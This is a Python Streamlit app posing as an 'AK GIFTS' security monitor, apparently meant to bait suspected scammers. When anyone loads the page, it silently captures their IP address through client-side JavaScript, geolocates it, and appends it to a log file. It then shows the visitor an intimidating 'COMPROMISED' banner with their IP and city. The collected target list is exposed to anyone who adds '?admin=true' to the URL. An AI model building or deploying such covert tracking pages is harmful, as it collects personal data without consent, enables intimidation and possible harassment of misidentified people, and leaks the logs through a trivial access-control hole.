import streamlit as st
import pandas as pd
import requests
import os
from datetime import datetime
from streamlit_javascript import st_javascript

# 1. Setup
st.set_page_config(page_title="AK GIFTS | Internal Security", page_icon="🛡️", layout="wide")

# 2. Permanent Logging Function
LOG_FILE = "captured_ips.txt"

def log_to_file(ip, location):
    # Only log if it's a real IP and not already logged in this session
    if ip and ip != "Unknown" and "logged" not in st.session_state:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | IP: {ip} | Loc: {location}\n"
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
        st.session_state["logged"] = True
        print(f"!!! TARGET LOGGED: {ip} !!!")

# 3. Get Real IP via JavaScript
def get_ip():
    url = 'https://api64.ipify.org?format=json'
    script = f'await fetch("{url}").then(r => r.json())'
    result = st_javascript(script)
    if result and isinstance(result, dict):
        return result.get("ip")
    return st.context.ip_address # Fallback to new 2026 native IP

user_ip = get_ip()

# 4. Get Location Data
location_info = "Tracking..."
if user_ip:
    try:
        res = requests.get(f"http://ip-api.com/json/{user_ip}").json()
        if res.get("status") == "success":
            location_info = f"{res.get('city')}, {res.get('country')}"
            log_to_file(user_ip, location_info) # SAVE TO FILE
    except:
        location_info = "Trace Hidden"

# 5. UI / Dashboard Look
st.markdown("""
    <style>
    .warning-glow {
        color: #ff4b4b; font-weight: bold; font-size: 28px;
        text-shadow: 0 0 15px #ff4b4b; border: 2px solid #ff4b4b;
        padding: 20px; text-align: center; border-radius: 10px;
    }
    .footer { position: fixed; left: 0; bottom: 0; width: 100%; text-align: center; color: #444; padding: 10px; }
    </style>
    """, unsafe_allow_html=True)

st.title("🎁 AK GIFTS | Security Monitor")
st.markdown('<div class="warning-glow">⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN</div>', unsafe_allow_html=True)
st.divider()

# Metrics for the visitor to see
c1, c2, c3 = st.columns(3)
c1.metric("TRACED IP", user_ip if user_ip else "DETECTING...")
c2.metric("LOCATION", location_info.split(",")[0])
c3.metric("STATUS", "COMPROMISED", delta="-100%")

# 6. ADMIN VIEW (The Secret IP List)
# Visit your-app.streamlit.app/?admin=true to see this
if st.query_params.get("admin") == "true":
    st.divider()
    st.subheader("🕵️ ENKODER MASTER LOGS (All Targets)")
    
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = f.readlines()
        
        if logs:
            for line in reversed(logs): # Show newest first
                st.text(line.strip())
        else:
            st.info("No targets captured yet.")
    else:
        st.info("Log file starting up...")

st.markdown('<div class="footer">MADE BY ENKODER.</div>', unsafe_allow_html=True)
